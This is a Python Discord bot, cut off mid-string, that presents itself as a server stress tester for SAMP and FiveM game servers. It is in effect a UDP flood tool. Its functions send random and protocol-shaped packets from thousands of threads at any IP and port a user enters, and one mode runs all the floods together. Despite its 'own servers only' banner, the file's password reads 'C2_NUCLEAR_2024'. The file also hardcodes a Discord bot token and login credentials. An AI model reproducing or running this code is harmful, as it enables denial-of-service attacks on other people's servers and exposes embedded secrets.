#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - SERVER STRESS TEST TOOL ⚡
# 🔥 TEST YOUR OWN SAMP/FIVEM SERVERS ONLY 🔥
# ⚠️ ONLY USE ON SERVERS YOU OWN! ⚠️

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import aiohttp
import random
import socket
import struct
import time
import os
import ipaddress
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================
# بيانات تسجيل الدخول - LI ZANDYA SYSTEM
# ============================================
REQUIRED_IP = "187.121.21.12"
REQUIRED_USERNAME = "LI ZANDYA"
REQUIRED_PASSWORD = "C2_NUCLEAR_2024"
TOKEN = "MTQ4ODM1MTg1MzYwNjM0Mjg5Nw.GYiamS.vdbKKTutE2_R8ZTya-5MiZP9HULPhNecHoyqKM"

# ============================================
# إعدادات القوة القصوى
# ============================================
CPU_CORES = os.cpu_count() or 8
MAX_THREADS = CPU_CORES * 50000
MAX_PACKET_SIZE = 65507

try:
    import psutil
    TOTAL_RAM = psutil.virtual_memory().total // (1024**3)
except:
    TOTAL_RAM = 8

# ============================================
# قائمة User-Agents
# ============================================
USER_AGENTS = []
for v in range(100, 200):
    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")

# ============================================
# نظام اختبار الضغط - أنت تدخل الـ IP بنفسك
# ============================================
class StressTester:
    def __init__(self):
        self.running = False
        self.stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'total_tests': 0,
            'active_tests': 0,
            'start_time': None,
            'peak_speed': 0,
            'total_errors': 0,
        }
        self.threads = min(MAX_THREADS, 50000)
        self.test_log = []
        self.authenticated = False
        self.authenticated_user = None
        self.active_tests = {}
        self.executor = ThreadPoolExecutor(max_workers=self.threads)

    def check_auth(self, ip: str, username: str, password: str) -> bool:
        if ip == REQUIRED_IP and username.upper() == REQUIRED_USERNAME and password == REQUIRED_PASSWORD:
            self.authenticated = True
            self.authenticated_user = username
            return True
        return False

    def log_test(self, test_type: str, target: str, duration: int, packets: int, bytes_sent: int, errors: int = 0):
        rate = packets / duration if duration > 0 else 0
        
        if rate > self.stats['peak_speed']:
            self.stats['peak_speed'] = rate
        
        self.test_log.append({
            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'type': test_type,
            'target': target,
            'duration': duration,
            'packets': packets,
            'bytes': bytes_sent,
            'rate': rate,
            'errors': errors
        })
        if len(self.test_log) > 100:
            self.test_log.pop(0)

    # ============================================
    # اختبار UDP - لأي سيرفر (SAMP, FiveM, الخ)
    # ============================================
    async def udp_test(self, ip: str, port: int, duration: int) -> tuple:
        self.running = True
        if not self.stats['start_time']:
            self.stats['start_time'] = time.time()
        
        self.stats['active_tests'] += 1
        test_id = f"UDP_{ip}_{port}_{int(time.time())}"
        self.active_tests[test_id] = time.time()
        
        sent = 0
        bytes_sent = 0
        errors = 0
        
        # حزم UDP - مناسبة لـ SAMP و FiveM
        packets = [
            os.urandom(4096),
            os.urandom(8192),
            os.urandom(16384),
            os.urandom(32768),
        ]
        
        # حزمة SAMP خاصة
        samp_packet = b'SAMP' + struct.pack('<I', random.randint(1, 99999)) + b'\x80' + os.urandom(1000)
        # حزمة FiveM خاصة
        fivem_packet = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00' + os.urandom(500)
        
        all_packets = packets + [samp_packet, fivem_packet]
        
        def udp_worker():
            nonlocal sent, bytes_sent, errors
            socks = []
            for _ in range(100):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setblocking(False)
                    socks.append(sock)
                except:
                    errors += 1
            
            start = time.time()
            while self.running and time.time() - start < duration:
                for sock in socks:
                    try:
                        pkt = random.choice(all_packets)
                        sock.sendto(pkt, (ip, port))
                        sent += 1
                        bytes_sent += len(pkt)
                    except:
                        errors += 1
            
            for sock in socks:
                sock.close()
        
        workers = min(self.threads, 10000)
        futures = [self.executor.submit(udp_worker) for _ in range(workers)]
        
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_tests'] -= 1
        self.stats['total_tests'] += 1
        
        del self.active_tests[test_id]
        self.log_test("UDP TEST", f"{ip}:{port}", duration, sent, bytes_sent, errors)
        
        rate = sent / duration
        mbps = (bytes_sent / duration) / 1024 / 1024
        
        return sent, f"""
╔══════════════════════════════════════════════════════════════════╗
║                    ✅ UDP TEST COMPLETED ✅                      ║
╠══════════════════════════════════════════════════════════════════╣
║ 🎯 Target: {ip}:{port}                                           ║
║ ⏱️ Duration: {duration}s                                         ║
║ 📦 Packets: {sent:,}                                             ║
║ 💾 Data: {bytes_sent/1024/1024:.2f} MB                           ║
║ ⚡ Rate: {rate:,.0f} pps | {mbps:.2f} Mbps                       ║
║ ❌ Errors: {errors}                                              ║
╚══════════════════════════════════════════════════════════════════╝
"""

    # ============================================
    # اختبار SAMP خاص
    # ============================================
    async def samp_test(self, ip: str, port: int, duration: int) -> tuple:
        self.running = True
        self.stats['active_tests'] += 1
        test_id = f"SAMP_{ip}_{port}_{int(time.time())}"
        self.active_tests[test_id] = time.time()
        
        sent = 0
        bytes_sent = 0
        errors = 0
        
        def samp_worker():
            nonlocal sent, bytes_sent, errors
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            start = time.time()
            while self.running and time.time() - start < duration:
                try:
                    # بناء حزمة SAMP
                    packet = b'SAMP'
                    packet += struct.pack('<I', random.randint(1, 10000))
                    packet += b'\x80'
                    packet += struct.pack('<fffff', 
                        random.uniform(-3000,3000), random.uniform(-3000,3000),
                        random.uniform(-3000,3000), random.uniform(0,360), random.uniform(0,360))
                    packet += struct.pack('<I', random.randint(1,46))
                    packet += struct.pack('<I', 99999)
                    packet += os.urandom(2000)
                    
                    sock.sendto(packet, (ip, port))
                    sent += 1
                    bytes_sent += len(packet)
                except:
                    errors += 1
            
            sock.close()
        
        workers = min(self.threads, 5000)
        futures = [self.executor.submit(samp_worker) for _ in range(workers)]
        
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_tests'] -= 1
        self.stats['total_tests'] += 1
        
        del self.active_tests[test_id]
        self.log_test("SAMP TEST", f"{ip}:{port}", duration, sent, bytes_sent, errors)
        
        rate = sent / duration
        
        return sent, f"""
╔══════════════════════════════════════════════════════════════════╗
║                  ✅ SAMP TEST COMPLETED ✅                       ║
╠══════════════════════════════════════════════════════════════════╣
║ 🎯 Target: {ip}:{port} (SAMP Server)                             ║
║ ⏱️ Duration: {duration}s                                         ║
║ 📦 Packets: {sent:,}                                             ║
║ 💾 Data: {bytes_sent/1024/1024:.2f} MB                           ║
║ ⚡ Rate: {rate:,.0f} pps                                         ║
║ ❌ Errors: {errors}                                              ║
╚══════════════════════════════════════════════════════════════════╝
"""

    # ============================================
    # اختبار FiveM خاص
    # ============================================
    async def fivem_test(self, ip: str, port: int, duration: int) -> tuple:
        self.running = True
        self.stats['active_tests'] += 1
        test_id = f"FIVEM_{ip}_{port}_{int(time.time())}"
        self.active_tests[test_id] = time.time()
        
        sent = 0
        bytes_sent = 0
        errors = 0
        
        enet_packets = [
            b'\x00\x00\x00\x00\x00\x00\x00\x00',
            b'\xff\xff\xff\xff\xff\xff\xff\xff',
            b'\x01\x00\x00\x00\x00\x00\x00\x00',
            b'\x02\x00\x00\x00\x00\x00\x00\x00',
            b'\x03\x00\x00\x00\x00\x00\x00\x00',
        ]
        
        def fivem_worker():
            nonlocal sent, bytes_sent, errors
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            start = time.time()
            while self.running and time.time() - start < duration:
                try:
                    packet = random.choice(enet_packets) + os.urandom(8192)
                    sock.sendto(packet, (ip, port))
                    sent += 1
                    bytes_sent += len(packet)
                except:
                    errors += 1
            
            sock.close()
        
        workers = min(self.threads, 5000)
        futures = [self.executor.submit(fivem_worker) for _ in range(workers)]
        
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_tests'] -= 1
        self.stats['total_tests'] += 1
        
        del self.active_tests[test_id]
        self.log_test("FIVEM TEST", f"{ip}:{port}", duration, sent, bytes_sent, errors)
        
        rate = sent / duration
        
        return sent, f"""
╔══════════════════════════════════════════════════════════════════╗
║                 ✅ FIVEM TEST COMPLETED ✅                       ║
╠══════════════════════════════════════════════════════════════════╣
║ 🎯 Target: {ip}:{port} (FiveM Server)                            ║
║ ⏱️ Duration: {duration}s                                         ║
║ 📦 Packets: {sent:,}                                             ║
║ 💾 Data: {bytes_sent/1024/1024:.2f} MB                           ║
║ ⚡ Rate: {rate:,.0f} pps                                         ║
║ ❌ Errors: {errors}                                              ║
╚══════════════════════════════════════════════════════════════════╝
"""

    # ============================================
    # اختبار شامل (كل الهجمات معاً)
    # ============================================
    async def ultimate_test(self, ip: str, port: int, duration: int, test_type: str = "ALL") -> tuple:
        self.running = True
        self.stats['active_tests'] += 1
        test_id = f"ULTIMATE_{ip}_{port}_{int(time.time())}"
        self.active_tests[test_id] = time.time()
        
        tasks = []
        
        if test_type == "ALL" or test_type == "UDP":
            tasks.append(self.udp_test(ip, port, duration))
        if test_type == "ALL" or test_type == "SAMP":
            tasks.append(self.samp_test(ip, port, duration))
        if test_type == "ALL" or test_type == "FIVEM":
            tasks.append(self.fivem_test(ip, port, duration))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        total_packets = 0
        total_bytes = 0
        for r in results:
            if isinstance(r, tuple) and len(r) > 0:
                total_packets += r[0] if isinstance(r[0], int) else 0
        
        self.stats['total_packets'] += total_packets
        self.stats['active_tests'] -= 1
        self.stats['total_tests'] += 1
        
        del self.active_tests[test_id]
        self.log_test("ULTIMATE TEST", f"{ip}:{port}", duration, total_packets, total_bytes)
        
        return total_packets, f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                   ✅ ULTIMATE TEST COMPLETED ✅                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ 📊 TEST STATISTICS                                                           ║
║ ═══════════════════════════════════════════════════════════════════════════ ║
║ 🎯 Target: {ip}:{port}                                                       ║
║ 🎮 Test Type: {test_type}                                                    ║
║ ⏱️ Duration: {duration}s                                                     ║
║ 📦 Total Packets: {total_packets:,}                                          ║
║ 💾 Total Data: {total_bytes/1024/1024:.2f} MB                                ║
║ ⚡ Rate: {total_packets/duration:,.0f} pps                                   ║
║ 🏆 Peak Speed: {self.stats['peak_speed']:,.0f} pps                           ║
║ 💀 Tests Completed: {self.stats['total_tests']}                              ║
║                                                                              ║
║ 🔥 SYSTEM POWER                                                              ║
║ ═══════════════════════════════════════════════════════════════════════════ ║
║ • CPU: {CPU_CORES} Cores                                                     ║
║ • Threads: {self.threads:,}                                                  ║
║ • RAM: {TOTAL_RAM} GB                                                        ║
║                                                                              ║
║ 💀 LI ZANDYA - STRESS TEST SYSTEM 💀                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

    async def stop(self):
        self.running = False
        return "⏹️ **ALL TESTS STOPPED!**"

# ============================================
# واجهة تسجيل الدخول
# ============================================
class LoginModal(Modal):
    def __init__(self, tester):
        super().__init__(title="💀 LI ZANDYA - LOGIN 💀")
        
        self.ip_input = TextInput(
            label="🌐 SERVER IP",
            placeholder=REQUIRED_IP,
            required=True,
            default=REQUIRED_IP
        )
        self.user_input = TextInput(
            label="👤 USERNAME",
            placeholder="LI ZANDYA",
            required=True,
            default="LI ZANDYA"
        )
        self.pass_input = TextInput(
            label="🔑 PASSWORD",
            placeholder="C2_NUCLEAR_2024",
            required=True,
            default="C2_NUCLEAR_2024"
        )
        
        self.add_item(self.ip_input)
        self.add_item(self.user_input)
        self.add_item(self.pass_input)
        self.tester = tester
    
    async def on_submit(self, interaction: discord.Interaction):
        ip = self.ip_input.value
        username = self.user_input.value
        password = self.pass_input.value
        
        if self.tester.check_auth(ip, username, password):
            self.tester.authenticated = True
            embed = discord.Embed(
                title="✅ ACCESS GRANTED ✅",
                description=f"""